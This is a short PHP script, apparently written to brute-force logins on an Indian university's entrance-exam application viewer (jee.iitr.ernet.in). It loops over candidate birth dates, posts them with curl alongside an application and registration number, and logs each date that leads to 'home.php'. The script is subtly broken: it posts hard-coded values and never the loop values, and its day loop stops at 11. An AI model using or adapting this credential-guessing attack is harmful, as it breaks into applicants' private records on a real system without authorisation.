<?php
$log = fopen('data.txt','a');
$file = file('2011.csv');
$file = array_reverse($file);
foreach($file as $line):

$person = explode(';',$line);
echo $person[0]."\n";
for($y=1993;$y>1991;$y--)
{
for($m=1;$m<13;$m++){
for($d=1;$d<12;$d++){
$dd=str_pad($d,2,"0",STR_PAD_LEFT);
$mm=str_pad($m,2,"0",STR_PAD_LEFT);
echo $dd."/".$mm."/".$y."\r";
$fields = array('appln_no'=>'B364036489','regn_no'=>'6155028','day'=>'24','month'=>'02','year'=>'1993','proceed'=>'Proceed');
$query = http_build_query($fields);
$result = shell_exec("curl -s -d'$query' -D- jee.iitr.ernet.in/viewapp/index.php -o/dev/null");
if(strpos($result,'home.php')!==false){
  echo "********************* FOUND ************\n";
  echo $person[0]."|".$dd."|".$mm.'|'.$y."\n";
  fwrite($log,$person[0]."|".$d."|".$m.'|'.$y."\n");
  break 3;
}
}
}
}

endforeach;
